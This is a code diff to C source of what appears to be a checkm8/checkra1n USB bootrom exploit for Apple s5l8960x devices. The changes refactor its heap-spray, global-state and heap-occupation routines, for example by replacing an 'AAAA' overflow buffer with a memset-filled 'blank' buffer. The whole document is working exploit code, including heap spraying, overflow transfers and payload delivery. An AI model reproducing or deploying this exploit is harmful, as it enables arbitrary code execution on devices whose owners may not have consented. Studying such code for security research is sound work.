@@ -1,11 +1,12 @@
 #include <iousb.h>
 #include <checkra1n_common.h>
 
-static unsigned char blank[2048]; // 00000000...
-static unsigned char AAAA[2048];  // 41414141...
+static unsigned char blank[2048];
 
 static void heap_spray(io_client_t client){
     transfer_t result;
+    
+    memset(&blank, '\0', 2048);
     
     result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
     DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
@@ -22,7 +23,7 @@ static void heap_spray(io_client_t client){
 #else
     
     async_transfer_t transfer;
-    bzero(&transfer, sizeof(async_transfer_t));
+    memset(&transfer, '\0', sizeof(async_transfer_t));
     
     // I think this will reduce stability. But it is definitely fast. (for macOS)
     // It doesn't make sense on iPhoneOS.
@@ -50,6 +51,8 @@ static void set_global_state(io_client_t client){
     unsigned int val;
     UInt32 sent;
     
+    memset(&blank, '\x41', 2048);
+    
     val = 1408; // t8010 & t8015 & s5l8960x
     
     /* val haxx
@@ -59,11 +62,11 @@ static void set_global_state(io_client_t client){
      */
     
     int i=0;
-    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0)) >= val){
+    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) >= val){
         i++;
         DEBUG_LOG("[%s] retry: %x\n", __FUNCTION__, i);
         usleep(10000);
-        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
+        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 64);
         DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
         usleep(10000);
     }
@@ -73,7 +76,7 @@ static void set_global_state(io_client_t client){
     DEBUG_LOG("[%s] sent: %x\n", __FUNCTION__, sent);
     DEBUG_LOG("[%s] val: %x\n", __FUNCTION__, val);
     
-    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
+    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
     DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
     heap_spray(client);
@@ -89,6 +92,8 @@ unsigned char yolo[] = {
 
 static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
     transfer_t result;
+    
+    memset(&blank, '\0', 2048);
     
     result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
     DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
@@ -113,8 +118,7 @@ static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload
 int checkra1n_s5l8960x(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
     int r;
     
-    bzero(blank, 2048);
-    memset(AAAA, 'A', 2048);
+    memset(&blank, '\0', 2048);
     
     LOG_EXPLOIT_NAME("checkm8");
     
@@ -122,8 +126,8 @@ int checkra1n_s5l8960x(io_client_t client, uint16_t cpid, checkra1n_payload_t pa
     io_reset(client);
     io_close(client);
     client = NULL;
-    usleep(10000);
-    get_device_time_stage(&client, 5, DEVICE_DFU);
+    usleep(1000);
+    get_device_time_stage(&client, 5, DEVICE_DFU, false);
     if(!client) {
         LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
@@ -137,7 +141,7 @@ int checkra1n_s5l8960x(io_client_t client, uint16_t cpid, checkra1n_payload_t pa
     io_close(client);
     client = NULL;
     usleep(10000);
-    get_device_time_stage(&client, 5, DEVICE_DFU);
+    get_device_time_stage(&client, 5, DEVICE_DFU, false);
     if(!client) {
         LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
@@ -147,11 +151,11 @@ int checkra1n_s5l8960x(io_client_t client, uint16_t cpid, checkra1n_payload_t pa
     heap_occupation(client, cpid, payload);
     
     LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
-    (*client->handle)->USBDeviceReEnumerate(client->handle, 0);
+    io_reenumerate(client);
     io_close(client);
     client = NULL;
     usleep(10000);
-    get_device_time_stage(&client, 5, DEVICE_DFU);
+    get_device_time_stage(&client, 5, DEVICE_DFU, false);
     if(!client) {
         LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
